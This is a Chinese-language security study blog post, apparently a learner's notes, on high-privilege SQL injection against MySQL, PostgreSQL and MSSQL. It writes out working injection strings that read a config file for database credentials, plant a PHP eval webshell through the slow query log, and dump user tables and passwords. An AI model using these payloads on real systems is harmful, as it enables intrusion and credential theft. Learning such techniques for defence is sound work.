@@ -1,0 +1,881 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Web学习25 | f4k3r&#39;s blog</title>
+  <meta name="keywords" content=" Web ">
+  <meta name="description" content="Web学习25 | f4k3r&#39;s blog">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="description" content="知识点1、脚本代码与数据库前置知识2、Access数据库注入-简易&amp;偏移 (数据库是通过脚本代码去连接执行的)3、MYSQL数据库注入-简易&amp;权限跨库 前置知识：-SQL注入漏洞产生原理分析-SQL注入漏洞危害利用分析-脚本代码与数据库操作流程-数据库名，表名，列名，数据-数据库类型，数据库用户，用户权限 案例ASP+Access-简易注入-字典猜解ASP+Access-偏移注入-">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Web学习24">
+<meta property="og:url" content="http://example.com/2024/06/14/Web%E5%AD%A6%E4%B9%A024/index.html">
+<meta property="og:site_name" content="f4k3r&#39;s blog">
+<meta property="og:description" content="知识点1、脚本代码与数据库前置知识2、Access数据库注入-简易&amp;偏移 (数据库是通过脚本代码去连接执行的)3、MYSQL数据库注入-简易&amp;权限跨库 前置知识：-SQL注入漏洞产生原理分析-SQL注入漏洞危害利用分析-脚本代码与数据库操作流程-数据库名，表名，列名，数据-数据库类型，数据库用户，用户权限 案例ASP+Access-简易注入-字典猜解ASP+Access-偏移注入-">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2024/06/14/Web%E5%AD%A6%E4%B9%A024/image-20240614120744457.png">
+<meta property="og:image" content="http://example.com/2024/06/14/Web%E5%AD%A6%E4%B9%A024/image-20240614164049651.png">
+<meta property="og:image" content="http://example.com/2024/06/14/Web%E5%AD%A6%E4%B9%A024/image-20240614165037445.png">
+<meta property="og:image" content="http://example.com/2024/06/14/Web%E5%AD%A6%E4%B9%A024/image-20240614165403276.png">
+<meta property="og:image" content="http://example.com/2024/06/14/Web%E5%AD%A6%E4%B9%A024/image-20240614165523403.png">
+<meta property="og:image" content="http://example.com/2024/06/14/Web%E5%AD%A6%E4%B9%A024/image-20240614165835878.png">
+<meta property="og:image" content="http://example.com/2024/06/14/Web%E5%AD%A6%E4%B9%A024/image-20240614165933556.png">
+<meta property="og:image" content="http://example.com/2024/06/14/Web%E5%AD%A6%E4%B9%A024/image-20240614165953037.png">
+<meta property="og:image" content="http://example.com/2024/06/14/Web%E5%AD%A6%E4%B9%A024/image-20240614170455089.png">
+<meta property="og:image" content="http://example.com/2024/06/14/Web%E5%AD%A6%E4%B9%A024/image-20240614170540136.png">
+<meta property="og:image" content="http://example.com/2024/06/14/Web%E5%AD%A6%E4%B9%A024/image-20240614171412294.png">
+<meta property="og:image" content="http://example.com/2024/06/14/Web%E5%AD%A6%E4%B9%A024/image-20240614173245587.png">
+<meta property="og:image" content="http://example.com/2024/06/14/Web%E5%AD%A6%E4%B9%A024/image-20240614173448728.png">
+<meta property="og:image" content="http://example.com/2024/06/14/Web%E5%AD%A6%E4%B9%A024/image-20240614173637081.png">
+<meta property="og:image" content="http://example.com/2024/06/14/Web%E5%AD%A6%E4%B9%A024/image-20240614174523439.png">
+<meta property="og:image" content="http://example.com/2024/06/14/Web%E5%AD%A6%E4%B9%A024/image-20240614174620749.png">
+<meta property="og:image" content="http://example.com/2024/06/14/Web%E5%AD%A6%E4%B9%A024/image-20240614174700819.png">
+<meta property="og:image" content="http://example.com/2024/06/14/Web%E5%AD%A6%E4%B9%A024/image-20240614174949240.png">
+<meta property="og:image" content="http://example.com/2024/06/14/Web%E5%AD%A6%E4%B9%A024/image-20240614175404009.png">
+<meta property="og:image" content="http://example.com/2024/06/14/Web%E5%AD%A6%E4%B9%A024/image-20240614175848649.png">
+<meta property="og:image" content="http://example.com/2024/06/14/Web%E5%AD%A6%E4%B9%A024/image-20240614175908833.png">
+<meta property="og:image" content="http://example.com/2024/06/14/Web%E5%AD%A6%E4%B9%A024/image-20240614180506435.png">
+<meta property="og:image" content="http://example.com/2024/06/14/Web%E5%AD%A6%E4%B9%A024/image-20240614180821075.png">
+<meta property="og:image" content="http://example.com/2024/06/14/Web%E5%AD%A6%E4%B9%A024/image-20240614181002476.png">
+<meta property="og:image" content="http://example.com/2024/06/14/Web%E5%AD%A6%E4%B9%A024/image-20240614181359897.png">
+<meta property="og:image" content="http://example.com/2024/06/14/Web%E5%AD%A6%E4%B9%A024/image-20240614181725081.png">
+<meta property="og:image" content="http://example.com/2024/06/14/Web%E5%AD%A6%E4%B9%A024/image-20240614181924132.png">
+<meta property="og:image" content="http://example.com/2024/06/14/Web%E5%AD%A6%E4%B9%A024/image-20240614182255913.png">
+<meta property="og:image" content="http://example.com/2024/06/14/Web%E5%AD%A6%E4%B9%A024/image-20240614182519699.png">
+<meta property="og:image" content="http://example.com/2024/06/14/Web%E5%AD%A6%E4%B9%A024/image-20240614182614571.png">
+<meta property="og:image" content="http://example.com/2024/06/14/Web%E5%AD%A6%E4%B9%A024/image-20240614182927684.png">
+<meta property="og:image" content="http://example.com/2024/06/14/Web%E5%AD%A6%E4%B9%A024/image-20240614183119978.png">
+<meta property="og:image" content="http://example.com/2024/06/14/Web%E5%AD%A6%E4%B9%A024/image-20240614183359106.png">
+<meta property="og:image" content="http://example.com/2024/06/14/Web%E5%AD%A6%E4%B9%A024/image-20240614184503367.png">
+<meta property="og:image" content="http://example.com/2024/06/14/Web%E5%AD%A6%E4%B9%A024/image-20240614184824788.png">
+<meta property="article:published_time" content="2024-06-14T03:24:45.000Z">
+<meta property="article:modified_time" content="2024-06-14T11:09:14.915Z">
+<meta property="article:author" content="f4k3r">
+<meta property="article:tag" content="Web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2024/06/14/Web%E5%AD%A6%E4%B9%A024/image-20240614120744457.png">
+
+
+<link rel="icon" href="/img/avatar.jpg">
+
+<link href="/css/style.css?v=1.1.0" rel="stylesheet">
+
+<link href="/css/hl_theme/atom-dark.css?v=1.1.0" rel="stylesheet">
+
+<link href="//cdn.jsdelivr.net/npm/animate.css@4.1.0/animate.min.css" rel="stylesheet">
+
+<script src="//cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
+<script src="/js/titleTip.js?v=1.1.0" ></script>
+
+<script src="//cdn.jsdelivr.net/npm/highlightjs@9.16.2/highlight.pack.min.js"></script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
+
+<script src="//cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js"></script>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/jquery.cookie@1.4.1/jquery.cookie.min.js" ></script>
+
+<script src="/js/iconfont.js?v=1.1.0" ></script>
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+<div style="display: none">
+  <input class="theme_disqus_on" value="false">
+  <input class="theme_preload_comment" value="">
+  <input class="theme_blog_path" value="">
+  <input id="theme_shortcut" value="true" />
+  <input id="theme_highlight_on" value="true" />
+  <input id="theme_code_copy" value="true" />
+</div>
+
+
+
+<body>
+<aside class="nav">
+    <div class="nav-left">
+        <a href="/"
+   class="avatar_target">
+    <img class="avatar"
+         src="/img/avatar.jpg"/>
+</a>
+<div class="author">
+    <span>f4k3r</span>
+</div>
+
+<div class="icon">
+    
+</div>
+
+
+
+
+
+<ul>
+    <li>
+        <div class="all active" data-rel="全部文章">全部文章
+            
+                <small>(34)</small>
+            
+        </div>
+    </li>
+    
+</ul>
+<div class="left-bottom">
+    <div class="menus">
+        
+            
+            
+            
+    </div>
+    <div>
+        
+        <a 
+                                           class="friends">友链</a>
+        
+    </div>
+</div>
+<input type="hidden" id="yelog_site_posts_number" value="34">
+
+<div style="display: none">
+    <span id="busuanzi_value_site_uv"></span>
+    <span id="busuanzi_value_site_pv"></span>
+</div>
+
+    </div>
+    <div class="nav-right">
+        <div class="friends-area">
+    <div class="friends-title">
+        友情链接
+        <i class="iconfont icon-left"></i>
+    </div>
+    <div class="friends-content">
+        <ul>
+            
+            <li><a target="_blank" href="http://www.blog.st4rr.top/">St4rr</a></li>
+            
+        </ul>
+    </div>
+</div>
+        <div class="title-list">
+    <div class="right-top">
+        <div id="default-panel">
+            <i class="iconfont icon-search" data-title="搜索 快捷键 i"></i>
+            <div class="right-title">全部文章</div>
+            <i class="iconfont icon-file-tree" data-title="切换到大纲视图 快捷键 w"></i>
+        </div>
+        <div id="search-panel">
+            <i class="iconfont icon-left" data-title="返回"></i>
+            <input id="local-search-input" autocomplete="off"/>
+            <label class="border-line" for="input"></label>
+            <i class="iconfont icon-case-sensitive" data-title="大小写敏感"></i>
+            <i class="iconfont icon-tag" data-title="标签"></i>
+        </div>
+        <div id="outline-panel" style="display: none">
+            <div class="right-title">大纲</div>
+            <i class="iconfont icon-list" data-title="切换到文章列表"></i>
+        </div>
+    </div>
+
+    <div class="tags-list">
+    <input id="tag-search" />
+    <div class="tag-wrapper">
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>服务器</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>随想</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>java</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>Linux</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>Web</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>WP</a>
+            </li>
+        
+    </div>
+
+</div>
+
+    
+    <nav id="title-list-nav">
+        
+        
+        <a  class="全部文章 "
+           href="/2024/06/15/Web%E5%AD%A6%E4%B9%A025/"
+           data-tag="Web"
+           data-author="" >
+            <span class="post-title" title="Web学习25">Web学习25</span>
+            <span class="post-date" title="2024-06-15 13:00:46">2024/06/15</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/06/14/Web%E5%AD%A6%E4%B9%A024/"
+           data-tag="Web"
+           data-author="" >
+            <span class="post-title" title="Web学习24">Web学习24</span>
+            <span class="post-date" title="2024-06-14 11:24:45">2024/06/14</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/06/13/Web%E5%AD%A6%E4%B9%A023/"
+           data-tag="Web"
+           data-author="" >
+            <span class="post-title" title="Web学习23">Web学习23</span>
+            <span class="post-date" title="2024-06-13 12:01:34">2024/06/13</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/06/13/Web%E5%AD%A6%E4%B9%A022/"
+           data-tag="Web"
+           data-author="" >
+            <span class="post-title" title="Web学习22">Web学习22</span>
+            <span class="post-date" title="2024-06-13 11:58:28">2024/06/13</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/06/12/Web%E5%AD%A6%E4%B9%A021/"
+           data-tag="Web"
+           data-author="" >
+            <span class="post-title" title="Web学习21">Web学习21</span>
+            <span class="post-date" title="2024-06-12 13:37:15">2024/06/12</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/06/11/java%E5%AD%A6%E4%B9%A0/"
+           data-tag="java"
+           data-author="" >
+            <span class="post-title" title="java学习">java学习</span>
+            <span class="post-date" title="2024-06-11 18:46:57">2024/06/11</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/06/11/Web%E5%AD%A6%E4%B9%A020/"
+           data-tag="Web"
+           data-author="" >
+            <span class="post-title" title="Web学习20">Web学习20</span>
+            <span class="post-date" title="2024-06-11 00:24:56">2024/06/11</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/06/10/Web%E5%AD%A6%E4%B9%A019/"
+           data-tag="Web"
+           data-author="" >
+            <span class="post-title" title="Web学习19">Web学习19</span>
+            <span class="post-date" title="2024-06-10 00:42:13">2024/06/10</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/06/08/Web%E5%AD%A6%E4%B9%A018/"
+           data-tag="Web"
+           data-author="" >
+            <span class="post-title" title="Web学习18">Web学习18</span>
+            <span class="post-date" title="2024-06-08 21:20:44">2024/06/08</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/06/08/Web%E5%AD%A6%E4%B9%A017/"
+           data-tag="Web"
+           data-author="" >
+            <span class="post-title" title="Web学习17">Web学习17</span>
+            <span class="post-date" title="2024-06-08 19:16:10">2024/06/08</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/06/06/Web%E5%AD%A6%E4%B9%A016/"
+           data-tag="Web"
+           data-author="" >
+            <span class="post-title" title="Web学习16">Web学习16</span>
+            <span class="post-date" title="2024-06-06 18:55:59">2024/06/06</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/06/05/Web%E5%AD%A6%E4%B9%A015/"
+           data-tag="Web"
+           data-author="" >
+            <span class="post-title" title="Web学习15">Web学习15</span>
+            <span class="post-date" title="2024-06-05 15:56:07">2024/06/05</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/06/04/Web%E5%AD%A6%E4%B9%A014/"
+           data-tag="Web"
+           data-author="" >
+            <span class="post-title" title="Web学习14">Web学习14</span>
+            <span class="post-date" title="2024-06-04 14:04:03">2024/06/04</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/06/04/Web%E5%AD%A6%E4%B9%A013/"
+           data-tag="Web"
+           data-author="" >
+            <span class="post-title" title="Web学习13">Web学习13</span>
+            <span class="post-date" title="2024-06-04 12:16:20">2024/06/04</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/06/02/Web%E5%AD%A6%E4%B9%A012/"
+           data-tag="Web"
+           data-author="" >
+            <span class="post-title" title="Web学习12">Web学习12</span>
+            <span class="post-date" title="2024-06-02 18:38:10">2024/06/02</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/06/02/LitCTF2024-WP/"
+           data-tag="WP"
+           data-author="" >
+            <span class="post-title" title="LitCTF2024_WP">LitCTF2024_WP</span>
+            <span class="post-date" title="2024-06-02 12:18:25">2024/06/02</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/05/30/LitCTF2023_WP/"
+           data-tag="Web"
+           data-author="" >
+            <span class="post-title" title="LitCTF2023_WP">LitCTF2023_WP</span>
+            <span class="post-date" title="2024-05-30 17:33:08">2024/05/30</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/05/29/Web%E5%AD%A6%E4%B9%A011/"
+           data-tag="Web"
+           data-author="" >
+            <span class="post-title" title="Web学习11">Web学习11</span>
+            <span class="post-date" title="2024-05-29 20:24:16">2024/05/29</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/05/29/Web%E5%AD%A6%E4%B9%A010/"
+           data-tag="Web"
+           data-author="" >
+            <span class="post-title" title="Web学习10">Web学习10</span>
+            <span class="post-date" title="2024-05-29 18:34:51">2024/05/29</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/05/28/Web%E5%AD%A6%E4%B9%A09/"
+           data-tag="Web"
+           data-author="" >
+            <span class="post-title" title="Web学习9">Web学习9</span>
+            <span class="post-date" title="2024-05-28 17:22:39">2024/05/28</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/05/28/Web%E5%AD%A6%E4%B9%A08/"
+           data-tag="Web"
+           data-author="" >
+            <span class="post-title" title="Web学习8">Web学习8</span>
+            <span class="post-date" title="2024-05-28 10:48:57">2024/05/28</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/05/27/Web%E5%AD%A6%E4%B9%A07/"
+           data-tag="Web"
+           data-author="" >
+            <span class="post-title" title="Web学习7">Web学习7</span>
+            <span class="post-date" title="2024-05-27 16:27:52">2024/05/27</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/05/27/%E5%85%B3%E4%BA%8EWindows%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%97%A0%E6%B3%95%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E8%BF%9E%E6%8E%A5%E4%B9%8B%E9%97%AE/"
+           data-tag="Web,服务器"
+           data-author="" >
+            <span class="post-title" title="关于Windows服务器无法远程桌面连接之问">关于Windows服务器无法远程桌面连接之问</span>
+            <span class="post-date" title="2024-05-27 16:24:10">2024/05/27</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/05/26/Web%E5%AD%A6%E4%B9%A06/"
+           data-tag="Web"
+           data-author="" >
+            <span class="post-title" title="Web学习6">Web学习6</span>
+            <span class="post-date" title="2024-05-26 18:36:19">2024/05/26</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/05/26/Web%E5%AD%A6%E4%B9%A05/"
+           data-tag="Web"
+           data-author="" >
+            <span class="post-title" title="Web学习5">Web学习5</span>
+            <span class="post-date" title="2024-05-26 13:10:51">2024/05/26</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/05/25/Web%E5%AD%A6%E4%B9%A04/"
+           data-tag="Web"
+           data-author="" >
+            <span class="post-title" title="Web学习4">Web学习4</span>
+            <span class="post-date" title="2024-05-25 16:12:43">2024/05/25</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/05/23/Web%E5%AD%A6%E4%B9%A03/"
+           data-tag="Web"
+           data-author="" >
+            <span class="post-title" title="Web学习3">Web学习3</span>
+            <span class="post-date" title="2024-05-23 19:38:49">2024/05/23</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/05/23/Web%E5%AD%A6%E4%B9%A02/"
+           data-tag="Web"
+           data-author="" >
+            <span class="post-title" title="Web学习2">Web学习2</span>
+            <span class="post-date" title="2024-05-23 12:34:18">2024/05/23</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/05/22/Web%E5%AD%A6%E4%B9%A01/"
+           data-tag="Web"
+           data-author="" >
+            <span class="post-title" title="Web学习1">Web学习1</span>
+            <span class="post-date" title="2024-05-22 20:44:54">2024/05/22</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/04/29/linux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0/"
+           data-tag="Web,Linux"
+           data-author="" >
+            <span class="post-title" title="Linux操作系统学习">Linux操作系统学习</span>
+            <span class="post-date" title="2024-04-29 15:35:19">2024/04/29</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/04/28/%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%94%B6%E8%97%8F/"
+           data-tag="Web"
+           data-author="" >
+            <span class="post-title" title="绕过姿势收藏">绕过姿势收藏</span>
+            <span class="post-date" title="2024-04-28 19:55:29">2024/04/28</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/04/23/XYCTF-WP/"
+           data-tag="WP"
+           data-author="" >
+            <span class="post-title" title="XYCTF_WP">XYCTF_WP</span>
+            <span class="post-date" title="2024-04-23 12:54:05">2024/04/23</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/04/14/faker%E7%9A%84%E5%BF%83%E9%AD%94/"
+           data-tag="随想"
+           data-author="" >
+            <span class="post-title" title="faker的心魔">faker的心魔</span>
+            <span class="post-date" title="2024-04-14 21:23:39">2024/04/14</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/03/14/sql%E6%B3%A8%E5%85%A5/"
+           data-tag="Web"
+           data-author="" >
+            <span class="post-title" title="sql注入">sql注入</span>
+            <span class="post-date" title="2024-03-14 19:31:21">2024/03/14</span>
+        </a>
+        
+        <div id="no-item-tips">
+
+        </div>
+    </nav>
+    <div id="outline-list">
+    </div>
+</div>
+
+    </div>
+    <div class="hide-list">
+        <div class="semicircle" data-title="切换全屏 快捷键 s">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div id="post">
+    <div class="pjax">
+        <article id="post-Web学习25" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">Web学习25</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        
+        <span class="tag">
+            <i class="iconfont icon-tag"></i>
+            
+            <a class="color4">Web</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+            发布时间 : <time class="date" title='最后更新: 2024-06-15 18:09:16'>2024-06-15 13:00</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-text">知识点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A1%88%E4%BE%8B"><span class="toc-text">案例</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MYSQL-root%E9%AB%98%E6%9D%83%E9%99%90%E8%AF%BB%E5%86%99%E6%B3%A8%E5%85%A5"><span class="toc-text">MYSQL-root高权限读写注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PostgreSQL-%E9%AB%98%E6%9D%83%E9%99%90%E8%AF%BB%E5%86%99%E6%B3%A8%E5%85%A5"><span class="toc-text">PostgreSQL-高权限读写注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSSQL-SQLserver-sa%E9%AB%98%E6%9D%83%E9%99%90%E8%AF%BB%E5%86%99%E6%89%A7%E8%A1%8C%E6%B3%A8%E5%85%A5"><span class="toc-text">MSSQL(SQLserver)-sa高权限读写执行注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%93%E5%B0%BE%E5%BD%A9%E8%9B%8B-%E6%9F%90Q%E7%89%8C%E8%BF%9D%E6%B3%95%E7%99%BB%E5%BD%95%E6%A1%86%E6%B3%A8%E5%85%A5"><span class="toc-text">结尾彩蛋-某Q牌违法登录框注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE"><span class="toc-text">思维导图</span></a></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-3 i,
+    .toc-level-3 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>1、SQL注入-MYSQL数据库<br>2、SQL注入-MSSQL数据库<br>3、SQL注入-P哦是通过热SQL数据库</p>
+<p>详细点：<br>Access无高权限注入点只能猜解，还是暴力猜解<br>MYSQL， PostgreSQL，MSSQL高权限注入点-可升级读写执行等</p>
+<h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><p>MYSQL-root高权限读写注入<br>PostgreSQL-高权限读写注入<br>MSSQL(SQLserver)-sa高权限读写执行注入<br>结尾彩蛋-某Q牌违法登录框注入</p>
+<p><img src="/2024/06/15/Web%E5%AD%A6%E4%B9%A025/image-20240615160846891.png"><br>sql语句的基本语法，可以读取数据库里的文件信息</p>
+<p><img src="/2024/06/15/Web%E5%AD%A6%E4%B9%A025/image-20240615160941946.png"><br>在d盘写入1.txt，内容为xxxx</p>
+<h3 id="MYSQL-root高权限读写注入"><a href="#MYSQL-root高权限读写注入" class="headerlink" title="MYSQL-root高权限读写注入"></a>MYSQL-root高权限读写注入</h3><p>相关文章：<a target="_blank" rel="noopener" href="https://cnblogs.com/hackxf/p/8975501.html">https://cnblogs.com/hackxf/p/8975501.html</a></p>
+<p><img src="/2024/06/15/Web%E5%AD%A6%E4%B9%A025/image-20240615161323440.png"></p>
+<p>在实际环境里读取数据，读到了x123</p>
+<p><img src="/2024/06/15/Web%E5%AD%A6%E4%B9%A025/image-20240615161426987.png"></p>
+<p>成功在d盘写入了123.txt，内容为yyy</p>
+<p><img src="/2024/06/15/Web%E5%AD%A6%E4%B9%A025/image-20240615162609676.png"></p>
+<p><img src="/2024/06/15/Web%E5%AD%A6%E4%B9%A025/image-20240615162642129.png"></p>
+<p>输入?id&#x3D;2 UNION SELECT 1,load_file(“D:&#x2F;phpstudy&#x2F;PHPTutorial&#x2F;WWW&#x2F;blog&#x2F;config&#x2F;conn.php”),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17得到了数据库的用户名和密码</p>
+<p><img src="/2024/06/15/Web%E5%AD%A6%E4%B9%A025/image-20240615163253603.png"></p>
+<p>通过报错出来的地址，写一个后门代码到给出的地址，搞这些小实验的时候要把杀毒软件关掉，不然会被误杀掉。</p>
+<p><img src="/2024/06/15/Web%E5%AD%A6%E4%B9%A025/image-20240615163947802.png"></p>
+<p>mysql的配置文件，框标出来的部分是配置是否要限制读写的操作，目前是空的，也就是不限制读写。如果写一个C:&#x2F;，那么就会限制只能在C的盘符上进行操作，而小迪的环境搭在D盘，所以就不能写后门代码了。</p>
+<p><img src="/2024/06/15/Web%E5%AD%A6%E4%B9%A025/image-20240615164152676.png"></p>
+<p>这个时候譬如说myadmin会有root用户的登录界面，如果能获取到用户名和密码，那就可以使用sql语句去突破secure_file_priv的配置了<br>set global slow_query_log &#x3D; 1;<br>set globla slow_query_log_file &#x3D; ‘shell路径’;<br>select’&lt;?php eval($_GET[A]?)&gt;’ or SLEEP(1);</p>
+<p><img src="/2024/06/15/Web%E5%AD%A6%E4%B9%A025/image-20240615165017056.png"></p>
+<p>global slow_query_log_file（漫日志）这个函数就是将你执行过的sql语句全部保存到一个文件里，所以就可以通过这个函数写入一个后门代码。</p>
+<p>总结：<br>-路径获取：phpinfo，报错，字典等<br>-无法写入：secure_file_priv突破 注入中需要支持SQL执行环境，如果没有就要借助phpmyadmin或能够直接连上对方数据库进行绕过</p>
+<h3 id="PostgreSQL-高权限读写注入"><a href="#PostgreSQL-高权限读写注入" class="headerlink" title="PostgreSQL-高权限读写注入"></a>PostgreSQL-高权限读写注入</h3><p>-测列数：<br>order by 4<br>and 1&#x3D;2 union select null,null,null,null<br>-测显位：第2，3<br>and 1&#x3D;2 union select ‘null’,null,null,null 错误<br>and 1&#x3D;2 union select null,’null’,null,null 正常<br>and 1&#x3D;2 union select null,null,’null’,null 正常<br>and 1&#x3D;2 union select null,null,null,’null’ 错误<br>-获取信息：<br>and 1&#x3D;2 union select null,current_user,current_database(),null分别回显用户和数据库名</p>
+<p><img src="/2024/06/15/Web%E5%AD%A6%E4%B9%A025/image-20240615170159711.png"></p>
+<p>and 1&#x3D;2 union select null,version(),null,null回显版本</p>
+<p><img src="/2024/06/15/Web%E5%AD%A6%E4%B9%A025/image-20240615170230484.png"></p>
+<p>-获取数据库名：<br>and 1&#x3D;2 union select null,string_agg(datname,’,’),null,null from pg_database</p>
+<p><img src="/2024/06/15/Web%E5%AD%A6%E4%B9%A025/image-20240615170532829.png"></p>
+<p>-获取表名：<br>1、and 1&#x3D;2 union select null,string_agg(tablename,’,’),null,null from pg_tables where schemaname&#x3D;’public’</p>
+<p>2、and 1&#x3D;2 union select null,string_agg(relname,’,’),null,null from pg_stat_user_tables</p>
+<p><img src="/2024/06/15/Web%E5%AD%A6%E4%B9%A025/image-20240615170703115.png"></p>
+<p>-获取列名：<br>and 1&#x3D;2 union select null,strint_agg(column_name,’,’),null,null from information_schema.columns where table_name&#x3D;’reg_users’</p>
+<p><img src="/2024/06/15/Web%E5%AD%A6%E4%B9%A025/image-20240615171115638.png"></p>
+<p>-获取数据：</p>
+<p>and 1&#x3D;2 union select null,string_agg(name,’,’),string_agg(password,’,’),null from reg_users</p>
+<p><img src="/2024/06/15/Web%E5%AD%A6%E4%B9%A025/image-20240615171127012.png"></p>
+<p>-补充-获取dba用户 （同样在DBA用户下，是可以进行文件读写的）：<br>and 1&#x3D;2 union select null,string_agg(usename,’,’),null,null FROM pg_user WHERE usesuper IS TRUE</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/249371.html">https://www.freebuf.com/sectool/249371.html</a></p>
+<h3 id="MSSQL-SQLserver-sa高权限读写执行注入"><a href="#MSSQL-SQLserver-sa高权限读写执行注入" class="headerlink" title="MSSQL(SQLserver)-sa高权限读写执行注入"></a>MSSQL(SQLserver)-sa高权限读写执行注入</h3><p>-测列数：<br>order by 4<br>and 1&#x3D;2 union all select null,null,null,null</p>
+<p><img src="/2024/06/15/Web%E5%AD%A6%E4%B9%A025/image-20240615172441487.png">-测显位：2,3<br>and 1&#x3D;2 union all select null,1,null,null<br>and 1&#x3D;2 union all select null,null,’s’,null<br>-获取信息：<br>@@version 获取版本信息<br>db_name() 当前数据库名字<br>user、system_user,current_user,user_name 获取当前用户名<br>@@SERVERNAME 获取服务器主机信息<br>and 1&#x3D;2 union all select null,db_name(),null,null</p>
+<p><img src="/2024/06/15/Web%E5%AD%A6%E4%B9%A025/image-20240615172533480.png"><br><img src="/2024/06/15/Web%E5%AD%A6%E4%B9%A025/image-20240615172549466.png"><br><img src="/2024/06/15/Web%E5%AD%A6%E4%B9%A025/image-20240615172624624.png"><br><img src="/2024/06/15/Web%E5%AD%A6%E4%B9%A025/image-20240615172648326.png"><br><img src="/2024/06/15/Web%E5%AD%A6%E4%B9%A025/image-20240615173052500.png"></p>
+<p>-获取表名：<br>and 1&#x3D;2 union all select null,(select top 1 name from mozhe_db_v2.dbo.sysobjects where xtype&#x3D;’u’),null,null</p>
+<p><img src="/2024/06/15/Web%E5%AD%A6%E4%B9%A025/image-20240615173151775.png"></p>
+<p>and 1&#x3D;2 union all select  null,(select top 1 name from mozhe_db_v2.dbo.sysobjects where xtype&#x3D;’u’ and name not in (‘manage’)),null,null</p>
